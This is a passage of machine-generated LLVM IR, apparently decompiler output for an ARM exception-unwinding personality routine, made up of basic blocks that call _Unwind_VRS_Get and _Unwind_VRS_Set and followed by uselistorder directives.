  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18e5c:                               ; preds = %bb157, %dec_label_pc_19168, %dec_label_pc_190f8, %bb166, %dec_label_pc_18dec, %dec_label_pc_18e58
  %v1_18e64 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19168 ], [ %v1_18e64.pre, %dec_label_pc_190f8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18dec ], [ 9, %dec_label_pc_18e58 ]
  store i32 %v3_18c78, i32* %r4.global-to-local, align 4
  store i32 %v6_18c78, i32* %r5.global-to-local, align 4
  ret i32 %v1_18e64

dec_label_pc_18e68:                               ; preds = %dec_label_pc_18e50
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  %v0_18e6c = load i32, i32* @r7, align 4
  %v1_18e6c = inttoptr i32 %v0_18e6c to i32*
  %v2_18e6c = load i32, i32* %v1_18e6c, align 4
  %tmp206 = bitcast i32 %v2_18e6c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18e74 = bitcast float %tmp207 to i32
  store i32 %v1_18e74, i32* @sl, align 4
  br i1 %v2_18da4, label %dec_label_pc_18e7c, label %dec_label_pc_18fe8

dec_label_pc_18e7c:                               ; preds = %dec_label_pc_18e68
  %v2_18e7c = icmp eq i32 %v0_18f34, 0
  br i1 %v2_18e7c, label %dec_label_pc_18fd0, label %dec_label_pc_18e84

dec_label_pc_18e84:                               ; preds = %dec_label_pc_18e7c
  %v2_18e88 = icmp eq i32 %v1_18e74, 0
  br i1 %v2_18e88, label %dec_label_pc_18e94.thread, label %bb159

dec_label_pc_18e94.thread:                        ; preds = %dec_label_pc_18e84
  br label %dec_label_pc_190f8

bb159:                                            ; preds = %dec_label_pc_18e84
  br i1 %v3_18e8c, label %dec_label_pc_18e9c, label %dec_label_pc_18fd0

dec_label_pc_18e9c:                               ; preds = %bb159
  %v1_18e9c = add i32 %v0_18e6c, 4
  store i32 %v1_18e9c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18eac = load i32, i32* @r8, align 4
  %v1_18eac = add i32 %v0_18eac, 88
  store i32 %v1_18eac, i32* %sb.global-to-local, align 4
  store i32 %v1_18e9c, i32* @r4, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18ec0:                               ; preds = %bb161
  %v1_18ec0 = add i32 %v0_18ec0, 1
  store i32 %v1_18ec0, i32* @r5, align 4
  %v1_18ec4 = load i32, i32* @sl, align 4
  %v9_18ec4 = icmp eq i32 %v1_18ec0, %v1_18ec4
  %v0_18ec8 = load i32, i32* @r4, align 4
  %v1_18ec8 = add i32 %v0_18ec8, 4
  store i32 %v1_18ec8, i32* @r4, align 4
  br i1 %v9_18ec4, label %dec_label_pc_190f8, label %dec_label_pc_18ec0.dec_label_pc_18ed0_crit_edge

dec_label_pc_18ec0.dec_label_pc_18ed0_crit_edge:  ; preds = %dec_label_pc_18ec0
  %v0_18edc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18ed0

dec_label_pc_18ed0:                               ; preds = %dec_label_pc_18ec0.dec_label_pc_18ed0_crit_edge, %dec_label_pc_18e9c
  %v0_18edc = phi i32 [ %v0_18edc.pre, %dec_label_pc_18ec0.dec_label_pc_18ed0_crit_edge ], [ %v1_18eac, %dec_label_pc_18e9c ]
  %v1_18ee0 = phi i32 [ %v1_18ec8, %dec_label_pc_18ec0.dec_label_pc_18ed0_crit_edge ], [ %v1_18e9c, %dec_label_pc_18e9c ]
  %v1_18ed0 = inttoptr i32 %v1_18ee0 to i32*
  %v2_18ed0 = load i32, i32* %v1_18ed0, align 4
  %v2_18ed4 = icmp eq i32 %v2_18ed0, 0
  store i32 %v0_18edc, i32* %forced_unwind_-44, align 4
  br i1 %v2_18ed4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18ed0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18ed0, %bb160
  %v0_18ee4 = load i32, i32* @r8, align 4
  store i32 %v0_18ee4, i32* %r0.global-to-local, align 4
  store i32 %v2_18f70, i32* %r2.global-to-local, align 4
  %v4_18ef4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 100) to i32*), align 4
  store i32 102144, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18ef4)
  %v0_18f00 = load i32, i32* %r0.global-to-local, align 4
  %v2_18f00 = icmp eq i32 %v0_18f00, 0
  %v0_18ec0 = load i32, i32* @r5, align 4
  br i1 %v2_18f00, label %dec_label_pc_18ec0, label %dec_label_pc_18f08

dec_label_pc_18f08:                               ; preds = %bb161
  %v1_18f08 = load i32, i32* @sl, align 4
  %v9_18f08 = icmp eq i32 %v0_18ec0, %v1_18f08
  br i1 %v9_18f08, label %dec_label_pc_190f8, label %dec_label_pc_18f10

dec_label_pc_18f10:                               ; preds = %dec_label_pc_18f08
  %v0_18f10 = load i32, i32* @r7, align 4
  %v1_18f10 = inttoptr i32 %v0_18f10 to i32*
  %v2_18f10 = load i32, i32* %v1_18f10, align 4
  %v1_18f14 = icmp slt i32 %v2_18f10, 0
  %v0_18f1c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18f14, label %dec_label_pc_18f1c, label %dec_label_pc_18fdc

dec_label_pc_18f1c:                               ; preds = %dec_label_pc_18f10, %dec_label_pc_18fd4
  %v0_18f1c = phi i32 [ %storemerge, %dec_label_pc_18fd4 ], [ %v0_18f1c.pre, %dec_label_pc_18f10 ]
  store i32 %v0_18f1c, i32* %r0.global-to-local, align 4
  %v1_18f20 = add i32 %v0_18f1c, 4
  store i32 %v1_18f20, i32* @r6, align 4
  br label %dec_label_pc_18fdc

dec_label_pc_18f28:                               ; preds = %bb154
  store i32 %v1_18ca8, i32* %r2.global-to-local, align 4
  br i1 %v2_18da4, label %dec_label_pc_18f34, label %dec_label_pc_19020

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18f28
  %v2_18f34 = icmp eq i32 %v0_18f34, 0
  br i1 %v2_18f34, label %dec_label_pc_18fa0, label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f34
  %v0_18f3c = load i32, i32* @r7, align 4
  %v1_18f3c = add i32 %v0_18f3c, 4
  %v2_18f3c = inttoptr i32 %v1_18f3c to i32*
  %v3_18f3c = load i32, i32* %v2_18f3c, align 4
  %v7_18f40 = icmp eq i32 %v3_18f3c, -2
  store i32 %v1_18f3c, i32* %r2.global-to-local, align 4
  br i1 %v7_18f40, label %dec_label_pc_18e58, label %dec_label_pc_18f4c

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f3c
  %v0_18f4c = load i32, i32* @r8, align 4
  %v1_18f4c = add i32 %v0_18f4c, 88
  %v7_18f50 = icmp eq i32 %v3_18f3c, -1
  store i32 %v1_18f4c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18f50, label %dec_label_pc_18f94, label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f4c
  %v2_18f60 = icmp eq i32 %v3_18f3c, 0
  br i1 %v2_18f60, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18f5c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18f5c, %bb162
  store i32 %v0_18f4c, i32* %r0.global-to-local, align 4
  store i32 %v2_18f70, i32* %r2.global-to-local, align 4
  %v4_18f7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 100) to i32*), align 4
  store i32 102280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18f7c)
  %v0_18f88 = load i32, i32* %r0.global-to-local, align 4
  %v2_18f88 = icmp eq i32 %v0_18f88, 0
  br i1 %v2_18f88, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18f94.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18f94

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18fa0

dec_label_pc_18f94:                               ; preds = %.thread25, %dec_label_pc_18f4c
  %v3_18f94 = phi i32 [ %v3_18f94.pr, %.thread25 ], [ %v1_18f4c, %dec_label_pc_18f4c ]
  %v2_18f98 = icmp eq i32 %v3_18f94, 0
  br i1 %v2_18f98, label %dec_label_pc_18fa0, label %dec_label_pc_190f8

dec_label_pc_18fa0:                               ; preds = %bb164, %dec_label_pc_1904c, %dec_label_pc_19020, %dec_label_pc_18f94, %dec_label_pc_18f34
  %v0_18fa0 = load i32, i32* @r7, align 4
  %v1_18fa0 = add i32 %v0_18fa0, 8
  %v1_18d08 = inttoptr i32 %v1_18fa0 to i32*
  %v2_18d08 = load i32, i32* %v1_18d08, align 4
  %v2_18d0c = icmp eq i32 %v2_18d08, 0
  br i1 %v2_18d0c, label %dec_label_pc_18dc8, label %dec_label_pc_18d14.preheader

dec_label_pc_18fa8:                               ; preds = %entry
  %v3_18fa8 = udiv i32 %v2_18c9c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18fb8 = mul nuw nsw i32 %v3_18fa8, 4
  %v3_18fbc = mul i32 %v2_18c9c, 65536
  %v2_18fc0 = add i32 %v6_18fb8, %v4_18c9c
  store i32 %v3_18fbc, i32* %v4_18cbc, align 8
  br label %dec_label_pc_18ce4

dec_label_pc_18fd0:                               ; preds = %bb159, %dec_label_pc_18e7c
  %v1_18fd0 = add i32 %v0_18e6c, 4
  br label %dec_label_pc_18fd4

dec_label_pc_18fd4:                               ; preds = %dec_label_pc_19014, %dec_label_pc_18fd0
  %v0_18fd4 = phi i32 [ %v2_19014, %dec_label_pc_19014 ], [ %v2_18e6c, %dec_label_pc_18fd0 ]
  %storemerge = phi i32 [ %v4_19014, %dec_label_pc_19014 ], [ %v1_18fd0, %dec_label_pc_18fd0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18fd4 = icmp slt i32 %v0_18fd4, 0
  br i1 %v1_18fd4, label %dec_label_pc_18f1c, label %dec_label_pc_18fdc

dec_label_pc_18fdc:                               ; preds = %dec_label_pc_18f10, %dec_label_pc_18fd4, %dec_label_pc_190e8, %dec_label_pc_18f1c
  %v0_18fe0 = phi i32 [ %v1_18f20, %dec_label_pc_18f1c ], [ %storemerge, %dec_label_pc_18fd4 ], [ %v1_190ec, %dec_label_pc_190e8 ], [ %v0_18f1c.pre, %dec_label_pc_18f10 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18f1c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18fd4 ], [ %v1_190e8, %dec_label_pc_190e8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f10 ]
  %v0_18fdc = load i32, i32* @sl, align 4
  %v3_18fdc = mul i32 %v0_18fdc, 4
  %v2_18fe0 = add i32 %v3_18fdc, %v0_18fe0
  %v1_18d0865 = inttoptr i32 %v2_18fe0 to i32*
  %v2_18d0866 = load i32, i32* %v1_18d0865, align 4
  %v2_18d0c68 = icmp eq i32 %v2_18d0866, 0
  br i1 %v2_18d0c68, label %dec_label_pc_18dc8, label %dec_label_pc_18d14.preheader.lr.ph

dec_label_pc_18fe8:                               ; preds = %dec_label_pc_18e68
  %v0_18ff8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18ff8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19000 = load i32, i32* @r8, align 4
  %v1_19000 = add i32 %v0_19000, 32
  %v2_19000 = inttoptr i32 %v1_19000 to i32*
  %v3_19000 = load i32, i32* %v2_19000, align 4
  store i32 %v3_19000, i32* @r4, align 4
  %v5_19004 = call i32 @_Unwind_VRS_Get(i32 %v0_18ff8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19004, i32* %r0.global-to-local, align 4
  %v3_19008 = load i32, i32* %stack_var_-48, align 4
  %v0_1900c = load i32, i32* @r4, align 4
  %v9_1900c = icmp eq i32 %v0_1900c, %v3_19008
  br i1 %v9_1900c, label %dec_label_pc_190b4, label %dec_label_pc_18fe8.dec_label_pc_19014_crit_edge

dec_label_pc_18fe8.dec_label_pc_19014_crit_edge:  ; preds = %dec_label_pc_18fe8
  %v0_19014.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19014

dec_label_pc_19014:                               ; preds = %dec_label_pc_18fe8.dec_label_pc_19014_crit_edge, %dec_label_pc_190b4
  %v0_19014 = phi i32 [ %v0_19014.pre, %dec_label_pc_18fe8.dec_label_pc_19014_crit_edge ], [ %v1_190b8, %dec_label_pc_190b4 ]
  %v1_19014 = inttoptr i32 %v0_19014 to i32*
  %v2_19014 = load i32, i32* %v1_19014, align 4
  %v4_19014 = add i32 %v0_19014, 4
  store i32 %v4_19014, i32* @r7, align 4
  br label %dec_label_pc_18fd4

dec_label_pc_19020:                               ; preds = %dec_label_pc_18f28
  %v0_19030 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19030, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19038 = load i32, i32* @r8, align 4
  %v1_19038 = add i32 %v0_19038, 32
  %v2_19038 = inttoptr i32 %v1_19038 to i32*
  %v3_19038 = load i32, i32* %v2_19038, align 4
  store i32 %v3_19038, i32* @r4, align 4
  %v5_1903c = call i32 @_Unwind_VRS_Get(i32 %v0_19030, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1903c, i32* %r0.global-to-local, align 4
  %v3_19040 = load i32, i32* %stack_var_-48, align 4
  %v0_19044 = load i32, i32* @r4, align 4
  %v9_19044 = icmp eq i32 %v0_19044, %v3_19040
  br i1 %v9_19044, label %dec_label_pc_1904c, label %dec_label_pc_18fa0

dec_label_pc_1904c:                               ; preds = %dec_label_pc_19020
  %v0_1904c = load i32, i32* @r8, align 4
  %v1_1904c = add i32 %v0_1904c, 40
  %v2_1904c = inttoptr i32 %v1_1904c to i32*
  %v3_1904c = load i32, i32* %v2_1904c, align 4
  %v1_19050 = load i32, i32* @r7, align 4
  %v9_19050 = icmp eq i32 %v3_1904c, %v1_19050
  br i1 %v9_19050, label %dec_label_pc_19058, label %dec_label_pc_18fa0

dec_label_pc_19058:                               ; preds = %dec_label_pc_1904c
  %v1_19058 = inttoptr i32 %v3_1904c to i32*
  %v2_19058 = load i32, i32* %v1_19058, align 4
  %v1_1905c = and i32 %v2_19058, 1073741824
  %v2_1905c = icmp eq i32 %v1_1905c, 0
  br i1 %v2_1905c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19058
  %v2_19060 = or i32 %v2_19058, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19058
  %tmp208 = bitcast i32 %v2_19058 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19064 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19068 = phi i32 [ %v2_19198, %.thread28 ], [ %v2_19198, %bb169 ], [ %v3_1904c, %bb165 ], [ %v3_1904c, %.thread26 ]
  %v0_19068 = phi i32 [ %v2_191a8, %.thread28 ], [ %v2_191a4, %bb169 ], [ %v2_19060, %bb165 ], [ %v2_19064, %.thread26 ]
  %v2_19068 = add i32 %v0_19068, %v1_19068
  store i32 %v2_19068, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19080, i32* %r0.global-to-local, align 4
  %v5_19088 = call i32 @_Unwind_VRS_Set(i32 %v0_19080, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19080, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_190a0 = load i32, i32* @r8, align 4
  store i32 %v0_190a0, i32* %stack_var_-48, align 4
  %v5_190a8 = call i32 @_Unwind_VRS_Set(i32 %v0_19080, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_190b4:                               ; preds = %dec_label_pc_18fe8
  %v0_190b4 = load i32, i32* @r8, align 4
  %v1_190b4 = add i32 %v0_190b4, 40
  %v2_190b4 = inttoptr i32 %v1_190b4 to i32*
  %v3_190b4 = load i32, i32* %v2_190b4, align 4
  %v1_190b8 = load i32, i32* @r7, align 4
  %v9_190b8 = icmp eq i32 %v3_190b4, %v1_190b8
  br i1 %v9_190b8, label %dec_label_pc_190c0, label %dec_label_pc_19014

dec_label_pc_190c0:                               ; preds = %dec_label_pc_190b4
  %v1_190c4 = add i32 %v3_190b4, 4
  store i32 %v1_190c4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_190cc = add i32 %v0_190b4, 44
  %v3_190cc = inttoptr i32 %v2_190cc to i32*
  store i32 0, i32* %v3_190cc, align 4
  %v0_190d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_190d0 = load i32, i32* @r8, align 4
  %v2_190d0 = add i32 %v1_190d0, 48
  %v3_190d0 = inttoptr i32 %v2_190d0 to i32*
  store i32 %v0_190d0, i32* %v3_190d0, align 4
  %v0_190d4 = load i32, i32* @sl, align 4
  %v1_190d4 = load i32, i32* @r8, align 4
  %v2_190d4 = add i32 %v1_190d4, 40
  %v3_190d4 = inttoptr i32 %v2_190d4 to i32*
  store i32 %v0_190d4, i32* %v3_190d4, align 4
  %v0_190d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_190d8 = load i32, i32* @r8, align 4
  %v2_190d8 = add i32 %v1_190d8, 52
  %v3_190d8 = inttoptr i32 %v2_190d8 to i32*
  store i32 %v0_190d8, i32* %v3_190d8, align 4
  %v0_190dc = load i32, i32* @r7, align 4
  %v1_190dc = inttoptr i32 %v0_190dc to i32*
  %v2_190dc = load i32, i32* %v1_190dc, align 4
  %v1_190e0 = icmp slt i32 %v2_190dc, 0
  br i1 %v1_190e0, label %dec_label_pc_190e8, label %dec_label_pc_19194

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190c0
  %v0_190e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_190e8 = add i32 %v0_190e8, -3
  store i32 %v1_190e8, i32* %r2.global-to-local, align 4
  %v0_190ec = load i32, i32* %r0.global-to-local, align 4
  %v1_190ec = add i32 %v0_190ec, 4
  store i32 %v1_190ec, i32* @r6, align 4
  br label %dec_label_pc_18fdc

dec_label_pc_190f8:                               ; preds = %dec_label_pc_18f08, %dec_label_pc_18f94, %dec_label_pc_18ec0, %dec_label_pc_18e94.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19108 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19108, i32* %r0.global-to-local, align 4
  %v5_19110 = call i32 @_Unwind_VRS_Get(i32 %v0_19108, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19114 = load i32, i32* @r7, align 4
  %v1_19114 = load i32, i32* @r8, align 4
  %v2_19114 = add i32 %v1_19114, 40
  %v3_19114 = inttoptr i32 %v2_19114 to i32*
  store i32 %v0_19114, i32* %v3_19114, align 4
  %v3_19118 = load i32, i32* %stack_var_-48, align 4
  %v3_1911c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1911c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19124 = load i32, i32* @r8, align 4
  %v2_19124 = add i32 %v1_19124, 32
  %v3_19124 = inttoptr i32 %v2_19124 to i32*
  store i32 %v3_19118, i32* %v3_19124, align 4
  %v0_19128 = load i32, i32* %r2.global-to-local, align 4
  %v1_19128 = load i32, i32* @r8, align 4
  %v2_19128 = add i32 %v1_19128, 36
  %v3_19128 = inttoptr i32 %v2_19128 to i32*
  store i32 %v0_19128, i32* %v3_19128, align 4
  %v1_18e64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_19130:                               ; preds = %bb155
  %v1_19130 = inttoptr i32 %v0_18db8 to i32*
  %v2_19130 = load i32, i32* %v1_19130, align 4
  %v1_19134 = add i32 %v0_18db8, 4
  %v1_19138 = and i32 %v2_19130, 1073741824
  %v2_19138 = icmp eq i32 %v1_19138, 0
  %v2_1913c = or i32 %v2_19130, -2147483648
  %tmp210 = bitcast i32 %v2_19130 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19140 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19138, i32 %v2_19140, i32 %v2_1913c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19144 = load i32, i32* @r8, align 4
  %v2_19144 = add i32 %v1_19144, 56
  %v3_19144 = inttoptr i32 %v2_19144 to i32*
  store i32 %v1_19134, i32* %v3_19144, align 4
  %v0_19148 = load i32, i32* @r8, align 4
  store i32 %v0_19148, i32* %r0.global-to-local, align 4
  %v4_19154 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 28) to i32*), align 4
  store i32 102752, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19154)
  %v0_19160 = load i32, i32* %r0.global-to-local, align 4
  %v2_19160 = icmp eq i32 %v0_19160, 0
  br i1 %v2_19160, label %dec_label_pc_18e58, label %dec_label_pc_19168

dec_label_pc_19168:                               ; preds = %dec_label_pc_19130
  %v0_19168 = load i32, i32* %r4.global-to-local, align 4
  %v1_19168 = load i32, i32* @r7, align 4
  %v2_19168 = add i32 %v1_19168, %v0_19168
  store i32 %v2_19168, i32* %stack_var_-48, align 4
  %v0_19178 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19178, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19188 = call i32 @_Unwind_VRS_Set(i32 %v0_19178, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_19194:                               ; preds = %dec_label_pc_190c0
  %v0_19194 = load i32, i32* @sl, align 4
  %v3_19194 = mul i32 %v0_19194, 4
  %v0_19198 = load i32, i32* %r0.global-to-local, align 4
  %v2_19198 = add i32 %v0_19198, %v3_19194
  %v3_19198 = inttoptr i32 %v2_19198 to i32*
  %v4_19198 = load i32, i32* %v3_19198, align 4
  %v1_1919c = and i32 %v4_19198, 1073741824
  %v2_1919c = icmp eq i32 %v1_1919c, 0
  br i1 %v2_1919c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19194
  %v2_191a4 = or i32 %v4_19198, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19194
  %tmp212 = bitcast i32 %v4_19198 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_191a8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19198, { 2, 1, 0 }
  uselistorder i32 %v1_190ec, { 1, 0 }
  uselistorder i32 %v1_190e8, { 1, 0 }
  uselistorder i32 %v1_190b8, { 1, 0 }
  uselistorder i32 %v0_19080, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1904c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19014, { 1, 0 }
  uselistorder i32 %v0_19014, { 1, 0 }
  uselistorder i32 %v2_18d0866, { 1, 0 }
  uselistorder i32 %v2_18fe0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18d08, { 1, 0 }
  uselistorder i32 %v1_18fa0, { 1, 0 }
  uselistorder i32 %v3_18f3c, { 2, 0, 1 }
  uselistorder i32 %v0_18f1c, { 1, 0 }
  uselistorder i32 %v0_18f1c.pre, { 1, 0 }
  uselistorder i32 %v1_18e74, { 1, 0 }
  uselistorder i32 %v2_18e6c, { 1, 0 }
  uselistorder i32 %v0_18dfc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18dbc, { 1, 0 }
  uselistorder i32 %v1_18db8, { 1, 0 }
  uselistorder i32 %v0_18db8, { 1, 0, 2 }
  uselistorder i32 %v4_18d90, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18f34, { 1, 2, 0 }
  uselistorder i32 %v0_18d68, { 1, 0 }
  uselistorder i32 %v3_18d64, { 1, 0, 2 }
  uselistorder i32 %v1_18d38, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18f70, { 1, 0 }
  uselistorder i1 %v2_18da4, { 1, 0, 2 }
  uselistorder i32 %v1_18ca8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 74, 0, 14, 15, 73, 16, 30, 17, 31, 18, 32, 20, 21, 22, 19, 29, 2, 1, 4, 33, 34, 35, 5, 36, 37, 38, 39, 6, 40, 41, 42, 43, 7, 44, 8, 45, 46, 23, 47, 9, 48, 49, 50, 24, 51, 10, 52, 53, 54, 25, 55, 56, 57, 26, 58, 11, 59, 60, 61, 62, 27, 63, 12, 64, 65, 66, 67, 68, 69, 28, 70, 13, 71, 3, 72 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 0, 3, 4 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 151, 28, 156, 150, 155, 29, 30, 31, 32, 33, 34, 35, 36, 149, 37, 38, 39, 41, 40, 43, 42, 44, 45, 2, 46, 0, 3, 47, 48, 50, 49, 1, 53, 51, 52, 54, 59, 55, 60, 56, 61, 57, 58, 62, 63, 64, 65, 67, 68, 66, 148, 70, 69, 73, 74, 75, 71, 72, 78, 76, 79, 77, 80, 81, 82, 83, 84, 86, 87, 85, 88, 152, 90, 89, 93, 94, 95, 91, 92, 96, 97, 99, 100, 101, 98, 102, 153, 103, 105, 104, 107, 106, 108, 154, 109, 111, 110, 113, 112, 115, 116, 114, 117, 118, 125, 119, 126, 120, 127, 121, 128, 122, 129, 123, 124, 131, 130, 132, 133, 134, 135, 140, 136, 141, 137, 142, 138, 139, 144, 143, 145, 146, 147 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22204.365 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_190f8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19014, { 1, 0 }
